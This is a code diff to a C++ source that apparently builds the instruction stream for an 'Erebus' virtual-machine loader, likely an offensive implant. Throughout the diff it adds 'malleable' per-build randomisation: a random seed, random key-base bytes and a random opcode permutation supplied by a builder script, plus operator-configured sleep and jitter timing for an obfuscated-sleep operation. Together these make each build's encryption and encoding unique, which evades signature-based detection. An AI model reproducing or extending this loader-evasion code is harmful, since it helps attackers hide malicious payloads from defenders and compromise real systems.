@@ -37,15 +37,46 @@
 // Seed and key derivation - must match vmloader.hpp exactly
 // ---------------------------------------------------------------------------
 
+// [MALLEABLE] Per-build 32-bit seed. builder.py passes -DVM_IR_SEED=0x...
+// with a fresh random value each build, making the XOR key unique.
 #ifndef VM_IR_SEED
 #define VM_IR_SEED 0xC0DE1337U
+#endif
+
+// [MALLEABLE] Per-build key derivation base (6 bytes). builder.py passes
+// -DVM_KEY_BASE_0=0x.. through _5 with random bytes each build, so the
+// derive_key output differs even if the seed is known.
+#ifndef VM_KEY_BASE_0
+#define VM_KEY_BASE_0 'e'
+#define VM_KEY_BASE_1 'r'
+#define VM_KEY_BASE_2 'e'
+#define VM_KEY_BASE_3 'b'
+#define VM_KEY_BASE_4 'u'
+#define VM_KEY_BASE_5 's'
+#endif
+
+// [MALLEABLE] Sleep timing operands written into the IR blob. builder.py
+// passes -DVM_SLEEP_BASE_MS=N -DVM_SLEEP_JITTER_MS=N from operator params.
+#ifndef VM_SLEEP_BASE_MS
+#define VM_SLEEP_BASE_MS 5000
+#endif
+#ifndef VM_SLEEP_JITTER_MS
+#define VM_SLEEP_JITTER_MS 3000
 #endif
 
 static std::array<std::uint8_t, 32>
 derive_key(std::uint32_t seed) noexcept
 {
     std::array<std::uint8_t, 32> key{};
-    constexpr std::uint8_t base[6] = {'e', 'r', 'e', 'b', 'u', 's'};
+    // [MALLEABLE] base bytes replaced per-build via VM_KEY_BASE_* defines.
+    constexpr std::uint8_t base[6] = {
+        (std::uint8_t)VM_KEY_BASE_0,
+        (std::uint8_t)VM_KEY_BASE_1,
+        (std::uint8_t)VM_KEY_BASE_2,
+        (std::uint8_t)VM_KEY_BASE_3,
+        (std::uint8_t)VM_KEY_BASE_4,
+        (std::uint8_t)VM_KEY_BASE_5,
+    };
     for (std::size_t i = 0; i < key.size(); ++i)
         key[i] = static_cast<std::uint8_t>(
             base[i % 6] + (seed & 0xFF) + i * 17u);
@@ -67,9 +98,26 @@ enum class ErebusVMOp : std::uint8_t {
     FreeRegion      = 7,
 };
 
-// forward_map[real_uint8] = encoded_byte
-// This is the inverse of LoaderVMConfig::opcode_reverse_map.
-static constexpr std::uint8_t forward_map[8] = {7, 5, 3, 1, 6, 0, 2, 4};
+// [MALLEABLE] Opcode forward map: forward_map[real_uint8] = encoded_byte.
+// This is the inverse of LoaderVMConfig::opcode_reverse_map in vmloader.hpp.
+// builder.py passes -DVM_FWD_0=N through _7 with a fresh random permutation
+// of [0..7] each build. The loader receives the same values as VM_FWD_* and
+// inverts them to its reverse map at compile time. Both halves must agree.
+#ifndef VM_FWD_0
+#define VM_FWD_0 7
+#define VM_FWD_1 5
+#define VM_FWD_2 3
+#define VM_FWD_3 1
+#define VM_FWD_4 6
+#define VM_FWD_5 0
+#define VM_FWD_6 2
+#define VM_FWD_7 4
+#endif
+
+static constexpr std::uint8_t forward_map[8] = {
+    VM_FWD_0, VM_FWD_1, VM_FWD_2, VM_FWD_3,
+    VM_FWD_4, VM_FWD_5, VM_FWD_6, VM_FWD_7
+};
 
 // Convenience alias so the op type matches vm_loader.hpp's template
 using OpT = vmkit::Op<ErebusVMOp>;
@@ -119,10 +167,11 @@ int main()
     }
 
     // op[1]: ObfuscatedSleep - u32[0]=base_ms, u32[1]=jitter_ms
+    // [MALLEABLE] timing values come from operator config via VM_SLEEP_*_MS defines.
     {
         OpT op = make_op(ErebusVMOp::ObfuscatedSleep);
-        op.u32[0] = 5000;
-        op.u32[1] = 3000;
+        op.u32[0] = static_cast<std::uint32_t>(VM_SLEEP_BASE_MS);
+        op.u32[1] = static_cast<std::uint32_t>(VM_SLEEP_JITTER_MS);
         program.push_back(op);
     }
 
